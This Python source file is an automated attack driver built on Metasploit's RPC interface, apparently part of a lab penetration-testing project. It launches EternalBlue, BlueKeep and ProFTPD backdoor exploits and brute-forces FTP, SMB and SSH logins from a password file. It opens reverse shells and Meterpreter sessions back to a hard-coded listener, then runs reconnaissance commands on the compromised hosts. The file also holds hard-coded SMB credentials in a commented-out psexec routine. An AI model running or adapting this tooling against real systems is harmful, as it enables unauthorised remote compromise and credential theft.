from pymetasploit3.msfrpc import MsfRpcClient
import logging, sys, random, time

# TODO MAKE IT NOT HARD CODED
LHOSTIP = '192.168.1.226'

class MetasploitInterface:
    portBindings = [55553]

    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, logLevel): # Just for metasploit connection
        self.verbosity = logLevel
        self.metasploit_ip = metasploit_ip
        self.metasploit_port = metasploit_port
        self.metasploit_pass = metasploit_pass
        self.client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
        self.cid = self.client.consoles.console().cid
        # self.verbosity = verbosity
        print(f"MSFRPCD API Connected @ {self.metasploit_ip}:{self.metasploit_port}")
        print(f"MSFRPCD OBJ: {self.client}")

    def reset(self):
        try:
            self.client.consoles.console(self.cid).destroy
        except:
            print('error')
            pass
        
        self.cid = self.client.consoles.console().cid

    def run(self, target, exploit, port): # This will just take in the info and use it   - does it just turn into self.client.etc?
        success, user_level, results = False, '', ''
        # switch statement to select exploit
        try:
            if(exploit == 'auxiliary/scanner/ftp/anonymous'):
                success, user_level, results = self.scanFTPAnon(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/ftp/ftp_login'):
                success, user_level, results = self.scanFTPLogin(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/ftp/ftp_version'):
                success, user_level, results = self.scanFTPversion(target, exploit, port)

            elif(exploit == 'exploit/unix/ftp/proftpd_133c_backdoor'):
                success, user_level, results = self.exploitFTP(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/smb/smb_ms17_010'):
                success, user_level, results = self.scanEternalBlue(target, exploit, port)

            elif(exploit == 'exploit/windows/smb/ms17_010_eternalblue'):
                success, user_level, results = self.exploitEternalBlue(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/rdp/rdp_scanner'):
                success, user_level, results = self.rdpScanner(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'):
                success, user_level, results = self.scanBlueKeep(target, exploit, port)
            
            elif(exploit == 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce'):
                success, user_level, results = self.exploitBlueKeep(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/ssh/ssh_login'):
                success, user_level, results = self.scanSSHlogin(target, exploit, port)
            
            elif(exploit == 'auxiliary/scanner/ssh/ssh_version'):
                success, user_level, results = self.scanSSHversion(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/smb/smb_version'):
                success, user_level, results = self.scanSMBversion(target, exploit, port)

            elif(exploit == 'auxiliary/scanner/smb/smb_login'):
                success, user_level, results = self.scanSMBlogin(target, exploit, port)
            else:
                print(f"{exploit}: Not implemented")
                return 0, "", ""
        except:
            print('sessionID being reset action failed')
            self.reset()
            return 0, "", ""
        
        return success, user_level, results

    def exploitFTP(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES FOR RETURN AND OBTAINS MODULE INFORMATION"""
        success, user_level, address_properties = False, '',''
        module, specific_module = self.getModuleInfo(exploit)
        
        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
     
        """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
        payload = self.client.modules.use('payload', 'cmd/unix/reverse')
        localPort = self.generateLPORT()
        payload['LHOST'] = LHOSTIP
        payload['LPORT'] = localPort
        
        
        """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT RESULTS"""
        
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)

        if self.verbosity == "INFO":
                print(results)

        number = -1
        if "Command shell session" in results:
            lines = results.split("\n")
            for line in lines:
                if "created in the background" in line:
                    number = line.split(" ")[2]
                    
        
        if number == -1:
            user_level = ""
            success = False;
            return  success, user_level, results
        
        try:
            shell = self.client.sessions.session(number)
            shell.write('whoami')
                
            user_level = shell.read()
                
            shell.write('ifconfig')
            address_properties = shell.read()
            
            success = True
            
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"User_Level: {user_level}")
                print(f"Address properties: \n {address_properties}")
            
        except Exception as e:
            if self.verbosity == "DEBUG":
                print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')

            user_level = ""
            success = False

        try:
            self.client.sessions.session(number).stop()
        except Exception:
            pass
        self.portBindings.remove(localPort)
        
        return success, user_level, results
        
    
    def scanFTPAnon(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)
        

        """ SETS UP USAGE OF METASPLOIT MODULE AND TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
       
        """ CREATION OF CONSOLE, EXPLOIT RUN AND RESULTS RETURNED"""
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        
        if self.verbosity == "INFO":
            print(results)
        
        """ PARSING RESULTS TO SET APPROPRIATE VALUES FOR RETURN"""
        if "Anonymous READ" in results:
            success = True
            user_level = "USER_ACCESS"
            if self.verbosity == "INFO":
                print(f'Success: {success}')
                print(f'User Level: {user_level}')
        else:
            success = False
            user_level = ""
            if self.verbosity == "DEBUG":
                print(f'Success: {success}')
                print(f'User Level: {user_level}')

        # self.client.consoles.console(self.cid).destroy

        return success, user_level, results


    def exploitEternalBlue(self, target, exploit, port):
        """ SETS UP VARIABLES AND MODULE INFORMATION"""
        success, user_level, properties = False, '', ''
        module, specific_module = self.getModuleInfo(exploit)


        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ GENERATES LOCAL PORT TO USE"""
        localPort = self.generateLPORT()

        """ GENERATES PAYLOAD INFORMATION """
        payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        payload['LHOST'] = LHOSTIP
        payload['LPORT'] = localPort
        
        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
        if self.verbosity == "INFO":
                print(results)
        
        number = -1

        if "Meterpreter session" in results:
            lines = results.split("\n")
            for line in lines:
                if "created in the background" in line:
                    number = line.split(" ")[2]
        
        if number == -1:
            user_level = ""
            success = False
            return  success, user_level, results
        
        try:
            shell = self.client.sessions.session(number)
            
            user_level = shell.run_with_output("getuid")
            
            user_level = user_level.split(":")[1].lstrip()
            
            directory = shell.run_with_output('pwd')
            
            properties = shell.run_with_output('ipconfig')
        
            if self.verbosity == "INFO":
                print(f'User Level: {user_level}')
                print(f'Directory Location: {directory}')
                print(f'Address Properties:\n {properties}')
            
            success = True
        
        except Exception as e:
            if self.verbosity == "DEBUG":
                print(f"There was an error with Eternal Blue (see below) \n {e}")
            user_level = ""
            success = False
        try:
            self.client.sessions.session(number).stop()
        except Exception:
            pass
        
        self.portBindings.remove(localPort)

        return success, user_level, results

    def rdpScanner(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND GETS MODULE INFO """
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE & RUNS EXPLOIT"""
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)
        
        """ PARSING OF RESULTS"""
        if "Detected" in results:
            success = True
            user_level = ""
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"User_Level: {user_level}")
        else:
            success = False
            user_level = ""


        return success, user_level, results

    def exploitBlueKeep(self, target, exploit, port):
        """SETS UP INTIAL VALUES AND MODULE INFO"""
        success, user_level, directory, properties = False, '', '',''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT and TARGET"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        # exploit["fDisableCam"] = 0
        # exploit["TARGET"] = '7'
        # exploit["LHOST"] = LHOSTIP

        """ CREATES EXPLOIT & RUNS EXECUTION"""
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
                print(results)
        # number = -1
        # try:
        #     shell = self.client.sessions.session(sid_after)
        #     print(sid_after)
        #     user_level = shell.run_with_output('echo %USERDOMAIN%\%USERNAME%')
            
        #     directory = shell.run_with_output('pwd')
        #     properties = shell.run_with_output('ipconfig')
        #     success = True
        #     if self.verbosity == "INFO":
        #         print(f'User Level: {user_level}')
        #         print(f'Directory Location: {directory}')
        #         print(f'Address Properties: \n {properties}')

        
        # except Exception as e:
        #     if self.verbosity == "DEBUG":
        #         print(f'There was an issue with BlueKeep (see below)\n {e}')
        #     user_level = ""
        #     success = False
        
        # self.client.consoles.console(self.cid).destroy
        
        return success, user_level, results
        

    def scanFTPLogin(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
        success, user_level = False, ''

        if port == 135 or port == 3389 or port == 3268:
            return False, '', ''

        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
        exploit["BRUTEFORCE_SPEED"] = 4
        exploit["STOP_ON_SUCCESS"] = True

        """ CREATES CONSOLE & RUNS EXPLOIT"""
        # self.cid = self.client.consoles.console().cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)

        if self.verbosity == "INFO":
            print(results)
            

        """ PARSES RESULTS FOR PROPER RETURN"""
        if "Login Successful" in results:
            success = True
            print("Credentials found:")
            for line in results.split("\n"):
                if "Login Successful" in line:
                    username = line.split(':')[3].lstrip()
                    password = line.split(":")[4]
                    print(f"Username: {username} Password: {password}")
                    user_level = "USER_ACCESS"            
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"User_Level: {user_level}")
               

        # self.client.consoles.console(self.cid).destroy

        return success, user_level, results

    def scanBlueKeep(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        """PARSES RESULTS FOR PROPER RETURN"""
        if "target is vulnerable" in results:
            success = True
            user_level = ""
    
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"user_level")

        return success, user_level, results


    def scanEternalBlue(self, target, exploit, port):
        """ SETS UP INITIAL VALUES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ CREATES MODULE & EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        # print(exploit.missing_required)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        """ PARSES RESULTS FOR PROPER RETURN"""
        if "VULNERABLE" in results:
            success = True
            user_level = ""

        return success, user_level, results

    def scanSMBlogin(self, target, exploit, port):
        """ SETS UP THE VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''

        if port == 21 or port == 22 or port == 593:
            return False, '', ''

        module, specific_module = self.getModuleInfo(exploit)

        """ CREATS MODULE AND SETS UP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)        
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        exploit["USERPASS_FILE"] = "/home/kali/bruteforce.txt"
        exploit["BRUTEFORCE_SPEED"] = 4


        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        """PARSES RESULTS FOR PROPER RETURN"""
        if "Success" in results:
            if self.verbosity == "INFO":
                print("Credentials Found:")

            for line in results.split("\n"):
                if "Success" in line:
                    username = line.split("'")[1].strip()
                    username = username.split('\\')[1]
                    print(username)
            success = True
            user_level = "USER_ACCESS"
        
        return success, user_level, results

    def scanSMBversion(self, target, exploit, port):
        """ SETS UP THE INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        if port != 445:
            False, "", ""

        """ CREATES MODULE & SETS UP EXPLOIT """
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
       
        """CREATES CONSOLE & EXECUTES EXPLOIT"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        if "SMB Detected" in results:
            success = True
            user_level = ""
        
        return success, user_level, results

    def scanSSHlogin(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """CREATES MODULE & SETUP EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port
        exploit["USERPASS_FILE"] = '/home/kali/bruteforce.txt'
        exploit["BRUTEFORCE_SPEED"] = 5
        exploit["VERBOSE"] = True
        exploit["STOP_ON_SUCCESS"] = True

        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
                print(results)

        number = -1
        credentials = ''
        # system_type = ''
        if "Command shell session" in results:
            lines = results.split('\n')
            for line in lines:
                if "Command shell session" in line:
                    number = line.split(" ")[4]
                if "Success" in line:
                    credentials = line.split("'")[1]
            if self.verbosity == "INFO":
                print("Credentials found:")
                print(credentials + "\n")

        """DEALS WITH MICROSOFT HOST WE HAVE ONE BOX THAT IS VULNERABLE"""
        if "Microsoft" in results:
            try:
                shell = self.client.sessions.session(number)
                screen_clear = shell.run_with_output("cls", "C")

                shell.write('whoami')
                user_name = shell.read()
                user_name = user_name.split("\n")[0]
            
                shell.write("cd")
                directory = shell.read()
                directory = directory.split("\n")[0]
                
                user_level = "admin"
                
                address_properties = shell.run_with_output('ipconfig', "C:\\")
                address_properties = address_properties.split("C:\\")[0]
                
                success = True
                if self.verbosity == "INFO":
                    print(f"Success: {success}")
                    print(f"User_Level: {user_level} : {user_name}")
                    print(f"Directory: {directory}")
                    print(f"Address properties: \n {address_properties}")

            except Exception as e:
                if self.verbosity == "DEBUG":
                    print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')

                user_level = ""
                success = False
           
            return success, user_level, results
            
        if number == -1:
            success = False
            user_level = ""
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"User_Level: {user_level}")

            return success, user_level, results
    
        try:
            shell = self.client.sessions.session(number)
            shell.write('whoami')
            
            user_name = shell.read()
            
            user_level = "USER_ACCESS"
            
            shell.write('ifconfig')
            address_properties = shell.read()
            
            success = True
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f"User_Level: {user_level}")
                print(f"Address properties: \n {address_properties}")

            
        except Exception as e:
            if self.verbosity == "DEBUG":
                print(f'There was an issue creating a session or the host is not vulnerable (see below):\n {e}')

            user_level = ""
            success = False

        try:
            self.client.sessions.session(number).stop()
        except Exception:
            pass
        
        # self.client.consoles.console(self.cid).destroy
       
        return success, user_level, results
        

    def scanSSHversion(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """CREATES MODULE & SETS UP EXPLOIT """
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port


        """ CREATES CONSOLE & EXECUTES EXPLOIT"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        if "SSH server version" in results:
            success = True
            user_level = ""
            if self.verbosity == "INFO":
                print(f"Success: {success}")
                print(f'User_Level: {user_level}')
  
        return success, user_level, results

    def scanFTPversion(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP MODULE AND EXPLOIT"""
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        exploit["RPORT"] = port

        """ CREATES CONSOLE AND EXECUTES MODULE"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit)
        if self.verbosity == "INFO":
            print(results)

        if "FTP Banner" in results:
            success = True
            user_level = ""
            if self.verbosity == "INFO":
                print(f'Success: {success}')
                print(f'User Level: {user_level}')
            
            

        return success, user_level, results

    # def exploitSMBpsexec(self, target, exploit, port):
        """ SETS UP INITIAL VARIABLES AND MODULE INFORMATION"""
        success, user_level = False, ''
        module, specific_module = self.getModuleInfo(exploit)

        """ SETS UP MODULE AND EXPLOIT """
        exploit = self.client.modules.use(module, specific_module)
        exploit["RHOSTS"] = target
        # exploit["RPORT"] = port
        exploit["SMBPass"] = "Passw0rd!"
        exploit["SMBUser"] = 'IEUser'
        # exploit["StagerRetryWait"] = 10
        
        exploit["ConnectTimeout"] = 30

        payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')

        payload['LHOST'] = LHOSTIP
        payload['LPORT'] = self.generateLPORT()
        payload["StagerRetryWait"] = 10
        payload["EXITFUNC"] = 'thread'
        
        """ CREATES CONSOLE & EXECUTES EXPLOIT ERROR HANDLING"""
        # self.cid = self.client.consoles.console().self.cid
        results = self.client.consoles.console(self.cid).run_module_with_output(exploit, payload=payload)
        # print(self.client.sessions.list)
        if self.verbosity == "INFO":
                print(results)
        number = -1
        if "Meterpreter session" in results:
            lines = results.split("\n")
            for line in lines:
                if "Meterpreter session" in line:
                    number = line.split("")[4]

        if number == -1:
            success = False
            user_level = ""
            return success, user_level, results
        
        try:
            shell = self.client.sessions.session(number)
            
            user_level = shell.run_with_output('echo %USERDOMAIN%\%USERNAME%')
            directory = shell.run_with_output('pwd')
            properties = shell.run_with_output('ipconfig')

            success = True
            if self.verbosity == "INFO":
                print(f'User Level: {user_level}')
                print(f'Directory Location: {directory}')
                print(f'Address Properties:\n {properties}')
        
        except Exception as e:
            if self.verbosity == "DEBUG":
                print(e)
            user_level = ""
            success = False
            
        try:
            self.client.sessions.session(number).stop()
        except Exception:
            pass
        # self.client.consoles.console(self.cid).destroy

        return success, user_level, results

    """GENERATES DIFFERENT LOCAL PORTS FOR USEAGE BY EXPLOITS """
    def generateLPORT(self):
        localPort = random.randint(49152,65535)

        while localPort in self.portBindings:
            localPort = random.ranint(49152,65535)
            
        self.portBindings.append(localPort)

        return localPort

    """ SEPARATES AND OBTAINS MODULE INFORMATION FOR SETUP"""
    def getModuleInfo(self, exploit):
        split_string = exploit.split('/')
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        return module, specific_module
        
# functions_list = [exploitFTP, scanFTP, eternalBlue, rdpScanner, blueKeep]

# Outputs:
